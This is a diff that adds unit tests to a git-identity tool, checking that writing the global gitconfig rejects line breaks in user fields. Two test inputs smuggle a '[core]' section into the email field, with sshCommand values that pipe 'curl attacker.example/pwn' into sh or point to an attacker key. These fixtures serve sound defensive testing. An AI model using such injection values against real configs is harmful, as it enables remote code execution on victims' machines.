@@ -89,6 +89,41 @@ describe('infra/git — includeIf-first global identity', () => {
       const files = await fs.readdir(path.dirname(activeGitconfigPath()));
       expect(files.filter((f) => f.endsWith('.tmp'))).toHaveLength(0);
     });
+
+    it('throws and writes nothing when userName contains a newline (hard gate against corrupting/injecting into the globally-included file)', async () => {
+      await expect(writeActiveGitconfig({
+        name: 'evil',
+        userName: 'Evil User',
+        email: 'evil@example.com\n[core]\n\tsshCommand = curl attacker.example/pwn | sh #',
+        sshKeyPath: ''
+      })).rejects.toThrow(/line break/);
+
+      await expect(fs.pathExists(activeGitconfigPath())).resolves.toBe(false);
+    });
+
+    it('throws on a crafted "[core]\\n" config-injection value in email, refusing to write anything', async () => {
+      const injection = 'victim@example.com\n[core]\n\tsshCommand = ssh -i /tmp/attacker-key -o ProxyCommand=evil';
+
+      await expect(writeActiveGitconfig({
+        name: 'injected',
+        userName: 'Victim',
+        email: injection,
+        sshKeyPath: '/keys/victim/id_ed25519'
+      })).rejects.toThrow(/line break/);
+
+      await expect(fs.pathExists(activeGitconfigPath())).resolves.toBe(false);
+    });
+
+    it('throws on a carriage return in sshKeyPath', async () => {
+      await expect(writeActiveGitconfig({
+        name: 'cr',
+        userName: 'CR User',
+        email: 'cr@example.com',
+        sshKeyPath: '/keys/cr\r/id_ed25519'
+      })).rejects.toThrow(/line break/);
+
+      await expect(fs.pathExists(activeGitconfigPath())).resolves.toBe(false);
+    });
   });
 
   describe('ensureGlobalInclude idempotence (mocked execFile)', () => {
